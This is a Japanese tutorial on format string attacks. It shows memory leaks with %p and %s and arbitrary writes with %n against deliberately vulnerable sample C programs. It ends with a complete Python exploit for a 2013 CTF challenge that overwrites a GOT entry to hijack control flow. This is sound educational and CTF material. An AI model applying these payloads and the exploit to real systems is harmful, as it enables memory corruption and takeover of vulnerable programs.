# Your First Format String Attacks.

## 1. What's the \`Format String Bugs'?
　Format String Bugs(以降, FSBとする)とは, `sprintf()`や`fprintf()`などのprintf関数群や`syslog()`などのFormat Strings(以降, 書式指定子とする)を扱える関数において, ユーザが自由に書式指定子を配置できるバグである. これを利用した攻撃手法をFormat String Attacksと呼び, この攻撃によりターゲットとなるプロセスがアクセス可能な任意のメモリの読み書きが行えるようになる. また, それを利用しプログラムの制御を乗っ取ることも可能である.    
　実際のプログラムに多く存在するとは到底言えないような脆弱性ではあるが稀に見つかることはある. CVE-2012-0809[1]ではsudoのデバッグ機能にFSBが見つかり, 実際にlocal exploitが公開されたりもした. 前述の通り珍しいものではあるが, 任意のメモリの書き換えができるなど非常に強力なものであることからCTFではよく題材にされる.   
　この記事ではFSBの検証に以下の環境を使用した. 
``` sh
sh-4.3$ uname -a
Linux Arch_Laptop 4.0.4-1-ARCH #1 SMP PREEMPT Mon May 18 06:43:19 CEST 2015 x86_64 GNU/Linux

sh-4.3$ gcc --version
gcc (GCC) 5.1.0
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

sh-4.3$ /lib/libc.so.6 
GNU C Library (GNU libc) stable release version 2.21, by Roland McGrath et al.
Copyright (C) 2015 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.1.0.
Available extensions:
    crypt add-on version 2.1 by Michael Glad and others
    GNU Libidn by Simon Josefsson
    Native POSIX Threads Library by Ulrich Drepper et al
    BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.archlinux.org/>.

```

## 2. A frank example:
### 2.1 Sample Code
　以下に示すコードには, L11にてFSBがある.  

``` c
#include <stdio.h>

int main()
{
    char buf[80];

    printf("plz, tell me yo name: ");
    fgets(buf, 80, stdin);

    printf("Hi, ");
    printf(buf); // I'm here XD

    return 0;
}
```  

これをSSP, NX無効でコンパイルして, ASLR無効にして実行してみる.   
``` sh
sh-4.3$ gcc -fno-stack-protector -z execstack fsb.c -o fsb
sh-4.3$ sudo sysctl -w kernel/randomize_va_space=0
kernel.randomize_va_space = 0
sh-4.3$ checksec --file fsb
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   fsb
sh-4.3$ ./fsb
plz, tell me yo name: hhc0null
Hi, hhc0null
```  

### 2.2 Information Leak
　FSBがあるということなので, ためしにアドレスを表示する際に用いる書式指定子"%p %p %p %p %p %p %p %p %p"を置くと,   
``` sh
sh-4.3$ ./fsb
plz, tell me yo name: %p %p %p %p %p %p %p %p %p
Hi, 0x50 0xf7f8e5a0 0x804824d 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```
このように何か表示される. このときのスタックの内容は次のようになっている.  
![contents_in_stack.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/contents_in_stack.png "contents")  
赤枠がprintf()に渡された第一引数で, 矢印のとおり0x25207025(x86はリトルエンディアンなので, "%p %"を意味する)を指している. "%p %p %p %p %p %p %p %p %p"は「esp+4以降の内容(青枠で囲われている部分)」をアドレスとして表示している.  
　この例について説明するために, まず通常時のprintf()の挙動を考える. printf()を正しく使用した場合は, 次の図に示すようになっている. 書式指定子ひとつひとつがそれぞれパラメータに対応している.   
![valid_formats_behavior.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/valid_formats_behavior.png "valid formats behavior")  
しかし, FSBのある状態では第一引数に渡る文字列により任意の書式指定子を置くことができ, 次の図のようにスタック内の「書式指定子に対応する値があるはずの箇所」に存在する値が無理やり対応づけられてしまう. そのため, 先ほどの例ようにスタック内の値が出力されてしまうのだ.    
![invalid_formats_behavior.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/invalid_formats_behavior.png "invalid formats behavior")  
したがって, FSBが存在する場合には"%p"を用いることで, printf()が呼び出される際のスタックの状態をダンプできる(Information Leak)と言える.  

　次に対応するパラメータを文字列として表示する書式指定子"%s"を入力してみよう.  
``` sh
sh-4.3$ ./fsb
plz, tell me yo name: %s%s%s%s
zsh: segmentation fault (core dumped)  ./fsb
```  
SEGVした. coredumpを吐いたのでgdbで何が起きたのかを調査してみよう.  
![why_segv.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/why_segv.png "why did segv happen?")  
printf()内で`repnz scas al,BYTE PTR es:[edi]`を実行しようとしたところ, 無効なアドレスへの書き込み(edi=0x50)となりSEGVを起こしたようだ. printf()が呼び出された際のスタックを次の図に示す(図では, まずgdb-pedaのsearchmemを利用して, "%s"をespから1ページ分探索している). 青枠が実際にediにロードされた値で, 赤枠が入力した文字列"%s %s %s %s"を指している.  
![contents_in_stack_in_case_of_segv.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/contents_in_stack_in_case_of_segv.png "segv caused!!")  
この例では"%s"が対応する値をアドレスとして参照するため, 不正なアドレスの参照としてSEGVが起きたのである. したがって「SEGVの起きないアドレス」であれば良いわけである. 例えば, 上図の緑枠にある0x0804824dは, .dynstrセクションに存在する文字列"\_\_libc\_start\_main"を指しているため, 書式指定子"%3$s"を用いることで正常に参照を行うことができる.   
``` sh
sh-4.3$ ./fsb 
plz, tell me yo name: %3$s
Hi, __libc_start_main
```  
もちろん, スタック上にあるアドレスであればいいので, 参照したいアドレスが0xdeadbeefならば"\xef\xbe\xad\xde"(x86なのでリトルエンディアンにする必要がある)というように文字列として配置することで参照できる.   

### 2.3 Overwrite a dword:) 
　前節では%pや%sによるスタック上や任意のアドレスを指定してのInformation Leakの手法を説明した. 任意のメモリの読み込みができるのなら, 次は任意のメモリの書き込みを行いたいところである. `printf()`系の関数群には"%n"という書式指定子が存在する. これを用いると, 「"%n"を処理するまでに表示したバイト数」を"%n"に対応するパラメータに書き込むことができる. このとき, "%[X]$n"というようにして"[X]"で対応するアドレスの位置を指定する.     
　上の説明だけでは理解しがたいと思われるので, 例を示しながら説明していく. 次のコードはどこからも呼ばれない`super_secret_function()`という関数がある.   
``` c
#include <stdio.h>

int wallet = 100; // $100

int main()
{
    char buf[80];

    printf("plz, tell me yo name: ");
    fgets(buf, 80, stdin);

    printf("Hi, ");
    printf(buf); // I'm here XD

    printf("You have $%d!!\n", wallet);

    return 0;
}
```  
これを実行すると,   
``` sh
plz, tell me yo name: hhc0null
Hi, hhc0null
You have $100!!
```
となる. ここでwalletの値を書き換えることを考えよう. このときに必要になる情報として, 変数walletのアドレスとスタック上においての配列bufの位置がある.   
　まず, 変数walletのアドレスを特定する. objdumpの結果から,   
``` sh
sh-4.3$ objdump -sj .data fsb_overwrite    

fsb_overwrite:     file format elf32-i386

Contents of section .data:
 8049788 00000000 00000000 64000000           ........d...    
```
100は16進数で0x64であることから, 変数walletは0x8049790にあることがわかる.   
　ここで, "%500xXXXXPPP\x90\x97\x04\x08"という文字列を`fgets()`に入力した場合, FSBのある`printf()`実行前のスタックがどうなっているかを観察しよう. ここで"PPP"はアドレスを4バイト境界に合わせるためのパディングである.    
![fsb_overwrite.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/fsb_overwrite.png "fsb overwrite")    
したがって, 一番最初に来る赤枠で囲われた部分から数えて, アドレス0x8049790は7つめに来るので"XXXX"は"%7$n"と決定する. これを踏まえて実行すると,   
``` sh
sh-4.3$ echo -e "%500x%7\$nPPP\x90\x97\x04\x08" > input
sh-4.3$ ./fsb_overwrite < input 
plz, tell me yo name: Hi,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   50PPP��
You have $500!!
```
と, 100だったものが500になる. この上書きの手法を利用するとNo(Partial) RELROなバイナリである場合において.got.pltにあるエントリを上書きし, 任意の関数を呼ぶなどができるようになる.    

## 3. Exercise
　座学だけではつまらないと思うので, 実際のCTFの過去問を解いて練習してみよう.   

### Boston Key Party CTF 2013 movie store 350pts
　Boston Key Party(以下, BkP) CTFは, アメリカのBkPというグループの主催するCTFである. その2013年の問題に, "movie store"というFSBを取り扱った問題がある. 問題文は, 
> movie store  
> pwning : 350  
> 
> There's a movie store, they sell some great movies. There's some administrator information on their box though, can you help us get it off? service is at 54.218.12.97 31337  
>   
>
> uploads/movies 

となっている. 

#### About the problem
肝心のプログラムmoviesについては, 
``` sh
sh-4.3$ checksec --file movies
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   movies
```
というようになっている. 適当に実行してみると, どうやらmoviesはDVDショップのオンライン注文システムを模したプログラムであることがわかる. 解析した結果から以下のことがわかる.   
- argvに"--admin"を置くことで`system("less adminhelp.nfo")`を実行できる. 
- 商品は0~255の番号で選択する.  
- 商品の在庫は20本である.  
- 一度に購入できる商品は12本まで. 
- 選択された商品番号は`std:string`で受け取り, `std::string::c_str()`と`atoi()`で数値に変換されて`std::vector::push_back()`される.  
- 注文を確定する際に`std::vector`から`char`の配列に変換される(実際は'\0'で終端されるので文字列とも言える).  
- 上記の配列を`printf()`で出力する(これがFSBとなっている).  
このとき, moviesはリモートで動作するものなので--adminは指定できない. 

#### Our approach
　先ほどのことを整理すると,

- buyMovies()で商品番号を使って生成したい文字列を用意する.   
- checkout()の`printf()`でGOTにある`putchar()`のエントリをoverwriteして, adminhelp.nfoを表示する.   

となる. 次に生成する文字列についてだが, 書き込みたい値を%xなどで作って%hnでwordずつ書き込むようにすればよい. このとき, 書き込みたいアドレスはGOTの`putchar()`のエントリなので, 0x804f154とする. 生成する文字列のテンプレートを以下に示す.   
``` py
"%[A]x%[Y]$hn%[B]x%[X]$hn\x54\xf1\x04\x08\x56\xf1\x04\x08" # X: 0x804f156, Y; 0x804f154
```
ここで, A, Bはそれぞれ書き込みたいword(2byte)の値を意味する. X, Yは"\x56\xf1\x04\x08"と"\x54\xf1\x04\x08"が`printf()`の可変長引数として考えた時に, いくつめに位置しているかを指す.    
　まずはA, Bを定めよう. 書き込みたい値は`adminMenu()`のアドレス0x80491f7である. これを上位, 下位wordに分けると0x804と0x91f7である. 更にこれをリトルエンディアンになるように書き込むことになる. ここで, Aについては0x804=2052をそのまま書き込めばよいが, Bについては少しトリッキーで%nの書き込む値が「その%nが現れるまでに表示したバイト数」なことから, 0x91f7-0x804=35315となる. したがって, A, Bを置き換えると次のようになる. 
``` py
"%2052x%[Y]$hn%35315x%[X]$hn\x54\xf1\x04\x08\x56\xf1\x04\x08" # X: 0x804f156の位置, Y; 0x804f154の位置
```
　次に, XとYについて定める. まず, この文字列自体が`printf()`の引数の位置が既知である必要がある. 適当に入力を用意して, `checkout()`の`printf()`で止めるために次のコマンドファイルを作成した. 
``` sh
b *checkout+265
shell python2 -c 'print "".join(map(lambda x: "b\n"+str(ord(x))+"\n", "ABCD"))+"c\n"' > tmp
r < tmp
```
このときのスタックの状態は次のようになっている. 
![movies_default_gap.png](https://raw.githubusercontent.com/hhc0null/fsb_data/master/movies_default_gap.png "default gap")  
したがって, 文字列の先頭を`printf()`で引数指定するときは+5のオフセットを加算する必要がある. X, Yを二桁の数字になると仮定すると, アドレスが現れるまでのbyte数は25\[byte\](`len("%2052x%YY$hn%35315x%XX$hn") # => 25`)となる.   
``` py
"%2052x%YY$hn%35315x%XX$hn\x54\xf1\x04\x08\x56\xf1\x04\x08" # XX: 0x804f156の位置(十進数2桁), YY; 0x804f154の位置(十進数2桁)
```
このとき, アドレスは4\[byte\]境界に配置する必要があるのでアドレスの前に3\[byte\]のパディングを配置する必要がある. ここでは"padding"に因んで'P'とする. 以上を踏まえ, 以下の文字列を生成することとする. 
``` py
"%2052x%13$hn%35315x%12$hnPPP\x54\xf1\x04\x08\x56\xf1\x04\x08"
# "%2052x" => 0x0804
# "%13$hn" => printf()の第14引数を指定(0x804f156がある)
# "%35315x" => 0x91f7-0x804
# "%12$hn" => printf()の第13引数を指定(0x804f154がある)
# "PPP" => パディング文字列
# "\x54\xf1\x04\x08" => アドレス0x804f154の文字列
# "\x56\xf1\x04\x08" => アドレス0x804f156の文字列
```
　次にこれを商品番号に変換する処理が必要となるが, これについては後述のソースコードに載せてあるので割愛する.   

#### Exploiting!
　さて, 最後にexploitと実行結果を示して終わりにしよう. admin.nfoにはダミーのFLAGとして"FROG_KEROKERO"という文字列を書き込んでおいた. 問題文の通りポート31337で待つような構造にしたいので, 適当なランチャを作って実行した. ランチャのコードは以下に示す. 
``` sh
#!/bin/sh

socat TCP-LISTEN:31337,reuseaddr,fork EXEC:./movies&
```

exploitは以下に示す. "# ------(ry"と書いてある部分より上のコードは"おまじない"である. 
``` py
#!/usr/bin/env python2
# BkP CTF 2013 pwn350 movie store

import binascii
import operator
import re
import socket
import struct
import subprocess
import sys
import telnetlib
import time


def read_until(f, delim='\n'):
    data = ""
    while not data.endswith(delim):
        data += f.read(1)
    return data

def connect(rhp=("localhost", 31337)):
    s = socket.create_connection(rhp)
    f = s.makefile('rw', bufsize=0)
    return s, f

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s

    print "[+] 4ll y0U n33D 15 5h3ll!!"
    t.interact()

def p(x, t="<I"):
    return struct.pack(t, x)

def u(x, t="<I"):
    return struct.unpack(t, x)[0]

def unsigned(x):
    return u(p(x, t="<i"), t="<I")

def message(message_type, message_body, value=None):
    text = ""
    if value:
        text = "[{}] {}: 0x{:08x}".format(message_type, message_body, value)
    else:
        text = "[{}] {}".format(message_type, message_body)
    print text

# -----------------------------------------------------------------------------

def encode_to_item_number(c):
    return "b\n{}\n".format(ord(c))

s, f = connect()

got_putchar = 0x804f154 
payload = "%2052x%13$hn%35315x%12$hnPPP"
payload += p(got_putchar)
payload += p(got_putchar+2)
payload += "".join(map(chr, xrange(128, 256))) # <= it's important. 
for x in map(encode_to_item_number, payload):
    command, item_number = x.split()
    read_until(f, "command: ")
    f.write(command+'\n')
    read_until(f, "cart\n")
    f.write(item_number+'\n')
read_until(f, "command: ")
f.write('c\n')

read_until(f)
read_until(f)
read_until(f)
print read_until(f)
```

実行結果を以下に示す. "(...skip...)"は長いので省略ということである. 
``` sh
(...skip...)
                                                                                                                                                                    
                                                      FROG_KEROKERO
```

#### Conclusion
　いかがだっただろうか? 文字列の配置の仕方が少々特殊ではあるが, GOT Overwriteを利用する問題としては非常にオーソドックスであったと思う.   
　exploit中にある"it's important."という行に関して, 普通に実行した場合とこの行をコメントアウトした場合についてを比較して欲しい. また, なぜこの行が必要であるかも考察してほしい.   


## 4. Summery  
　ここまででFormat String Attacksを利用したスタック上にある情報のリークや任意のメモリの上書きなどを試し, 実際の問題も解いてきた.   
　ところで, 私はpwnをする上で一番重要なことは任意のメモリへの書き込みだと考えている. プログラムの制御を奪うためには何らかの方法でEIP(RIP)を書き換えなければならないが, 一般的にx86(x64)ではプログラムの格納されているアドレスをメモリに配置しているため, 任意のアドレスを書き換えることでその制御を奪うことができるようになるのだ. それを容易に実現できるようにしてしまうFSBの恐ろしさと楽しさが解っていただけたら幸いである.   
　さて, 読者各位にはksnctfのVillager Bを解いていない方もいらっしゃると思う. また, その各位はおそらくこれを読んだあとならどうすればいいかが解るだろう. ここで得た感覚を活かし, Villager Bを解いていただきたい.

### Refs
- [1] Vulnerability Summary for CVE-2012-0809, https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0809
